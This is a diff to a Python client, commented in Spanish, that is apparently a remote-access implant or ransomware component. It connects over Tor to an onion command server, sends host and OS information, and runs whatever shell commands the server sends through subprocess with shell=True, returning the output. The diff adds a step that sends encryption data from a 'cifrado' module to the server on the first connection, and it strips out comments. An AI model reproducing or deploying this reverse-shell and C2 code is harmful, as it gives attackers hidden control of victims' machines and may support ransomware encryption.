@@ -72,6 +72,7 @@ def stop_portable_tor(proc, data_dir):
 
 
 def connect():
+    global BOOL_EJEC
     while True:
         try:
             print(f"[~] Intentando conectar a {ONION_HOST} (TOR)...")
@@ -96,15 +97,12 @@ def connect():
                         "os_info": os_info
                     }
 
-                    if not bool_ejec:
-                        # restorna las claves del cifrado
-                        #encrypted_key = 
-                        #ephemeral_public_key = 
-
-                        #data["encrypted_key"] = encrypted_key
-                        #data["ephemeral_public_key"] = ephemeral_public_key
-                        
-                        bool_ejec = True
+                     if not BOOL_EJEC:
+                        # retorna las claves del cifrado
+                        cif_data= cifrado.cif("dir")
+                        data["cif_data"] = cif_data
+                        print(data)                   
+                        BOOL_EJEC = True
                     
                     try:
                         raw_socket.sendall(json.dumps(data).encode("utf-8") + b"\n") # Usar sendall para asegurar que se envía todo
@@ -114,7 +112,6 @@ def connect():
                         print(f"[!] Error al enviar los datos JSON al servidor: {e}")                    
             except Exception as e:
                 print(f"[!] Error general en la función r: {e}")
-                # Aquí podrías considerar enviar un mensaje de error básico al servidor si la conexión sigue activa
                 return None
         
         except Exception as e:
@@ -130,14 +127,10 @@ def shell(client):
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,  # Redirige stderr a stdout
         shell=True,
-        # NO usar text=True aquí. Manejaremos la codificación manualmente.
-        # NO especificar encoding aquí, ya que codificaremos/decodificaremos manualmente.
     )
     empty_count = 0
     while True:
         try:
-            # Eliminar el envío de prompt constante aquí. El servidor no lo espera si ya funcionaba sin él.
-            # Solo enviar un prompt si el comando recibido es vacío.
 
             cmd = client.recv(BUFFER_SIZE).decode("utf-8").strip()
             
@@ -182,9 +175,7 @@ def shell(client):
                     print(f"[!] Error leyendo stdout de subprocess: {e}")
                     break # Salir si hay un error en la lectura
 
-            # Si no hay salida de stdout, revisar stderr (aunque ya redirigimos a stdout)
-            # La version anterior tenia esta logica, la mantendremos por si acaso
-            if not output and proc.stderr: # Añadido 'and proc.stderr' para evitar error si no hay stderr pipe
+            if not output and proc.stderr: 
                 try:
                     error_data = proc.stderr.read1(BUFFER_SIZE)
                     if error_data:
@@ -192,8 +183,6 @@ def shell(client):
                 except Exception as e:
                     print(f"[!] Error leyendo stderr de subprocess: {e}")
 
-
-            # Asegurarse de que siempre se envía algo, y que termine con un salto de línea para el servidor
             client.send(output if output else b"[sin salida]\n")
             print("[✓] Resultado enviado al servidor.\n")
 
@@ -226,8 +215,6 @@ def main():
             client.close()
             print("[~] Intentando reconectar...\n")
         except KeyboardInterrupt:
-            # Esto no debería ejecutarse, porque SIGINT ya está capturado arriba,
-            # pero lo dejamos por seguridad
             print("\n[CTRL+C] Interrumpido.")
             stop_portable_tor(proc, data_dir)
             break
